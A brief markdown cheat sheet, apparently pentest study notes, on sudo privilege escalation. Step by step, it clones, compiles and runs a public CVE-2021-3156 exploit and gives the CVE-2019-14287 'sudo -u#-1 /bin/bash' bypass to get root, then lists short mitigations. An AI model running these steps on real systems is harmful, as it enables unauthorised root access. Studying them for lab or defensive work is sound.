# Sudo

## Check Sudo Version

```bash
sudo -V | head -n1
```

## View Sudoers File (Clean Output)

```bash
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
```

## Check OS Version

```bash
cat /etc/lsb-release
cat /etc/os-release
```

## Clone Exploit (CVE-2021-3156)

```bash
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
```

## Compile Exploit

```bash
make
```

## Run Exploit

```bash
./sudo-hax-me-a-sandwich <target_id>
```

## Verify Root Access

```bash
id
whoami
```

---

## Check Sudo Privileges

```bash
sudo -l
```

## Check User ID (If Needed)

```bash
cat /etc/passwd | grep <username>
```

## Run Command as Root (CVE-2019-14287)

```bash
sudo -u#-1 id
sudo -u#-1 /bin/bash
```

## Verify Root Access

```bash
id
whoami
```

---

## Mitigation

* Keep sudo updated.
* Review `/etc/sudoers` regularly.
* Avoid overly permissive rules (especially `NOPASSWD`).
* Monitor sudo logs for suspicious activity.
